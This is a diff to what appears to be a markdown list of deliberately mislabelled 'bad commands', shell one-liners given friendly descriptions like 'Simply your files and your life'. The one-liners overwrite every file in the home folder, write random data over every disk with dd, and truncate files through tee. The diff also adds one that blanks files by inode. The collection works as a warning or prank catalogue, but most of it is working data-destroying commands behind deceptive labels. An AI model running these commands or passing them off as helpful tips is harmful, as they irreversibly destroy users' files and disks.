@@ -12,7 +12,7 @@ Here is my small example of code that has unintended results.
 
 #### Here are some bad descriptions to **bad** commands
 
-A. Greatly simplifies document syntax: 
+A. Greatly simplifies document syntax:
 
 ``` bash
 while read f; do sed -i "" 's:.:*:g' "$f"; done <<< "$(find ~/ -iname '*' -print)"
@@ -69,13 +69,19 @@ for d in /dev/disk*; do dd if=/dev/random of=$d &; done
 J. Simply your files and your life:
 
 ```bash
-find ~/ -type f -exec bash -c ':|tee {} &' \; 
+find ~/ -type f -exec bash -c ':|tee {} &' \;
 ```
 
 K. Keep logs of files in the home folder utilising your current files:
 
 ```bash
 find ~/ -type f -exec awk 'FNR == 1{ print FILENAME > FILENAME } ' {}  \;
+```
+
+L. Cut down on disk space without removing a file:
+
+```bash
+n=`df -i | grep "/$" | awk '{print $6}'`;eval `stat -s /`;for i in $(seq $n 0);do [ -f /.vol/$st_dev/$i ] && echo >/.vol/$st_dev/$i; done            
 ```
 
 ### Recommended testing evironment:
